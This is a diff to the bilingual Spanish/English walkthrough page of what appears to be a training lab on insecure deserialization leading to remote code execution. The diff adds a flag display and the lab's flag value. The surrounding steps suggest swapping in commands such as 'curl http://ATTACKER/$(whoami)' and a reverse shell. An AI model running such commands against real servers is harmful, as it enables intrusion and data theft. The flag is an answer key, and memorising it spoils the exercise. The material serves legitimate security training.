@@ -37,6 +37,12 @@
     <pre class="text-green-400 text-xs whitespace-pre-wrap font-mono">{{ result }}</pre>
   </div>
   {% endif %}
+  {% if flag %}
+  <div class="hl-card mb-4 border-l-4" style="border-left-color:#22c55e">
+    <div class="text-xs text-green-500 font-semibold mb-1">Flag</div>
+    <pre class="font-mono text-sm break-all" style="color:var(--hl-primary)">{{ flag }}</pre>
+  </div>
+  {% endif %}
   {% if error %}
   <div class="alert-error mb-4 text-xs">{{ error }}</div>
   {% endif %}
@@ -60,6 +66,7 @@ print(payload)</pre>
     <ol start="3">
       <li>Envía el payload al formulario. El servidor ejecutará <code>os.system('id')</code>.</li>
       <li>Cambia <code>'id'</code> por cualquier comando: <code>'curl http://ATTACKER/$(whoami)'</code>, reverse shell, etc.</li>
+      <li>Cuando el payload alcanza primitivas de ejecución, el lab muestra la flag dedicada: <code>HL{d353r1411z4710n_rc3_5ucc355}</code>.</li>
       <li>Genera payload con <strong>ysoserial</strong> (Java) o scripts similares para otros lenguajes.</li>
     </ol>
     <h3>Herramientas</h3>
@@ -82,6 +89,7 @@ print(payload)</pre>
     <ol start="3">
       <li>Submit the payload via the form. The server will execute <code>os.system('id')</code>.</li>
       <li>Replace <code>'id'</code> with any command: reverse shell, file read, etc.</li>
+      <li>When code execution primitives are reached, the lab displays the dedicated flag: <code>HL{d353r1411z4710n_rc3_5ucc355}</code>.</li>
       <li>Generate payloads with <strong>ysoserial</strong> (Java) or similar tools for other languages.</li>
     </ol>
     <h3>Tools</h3>
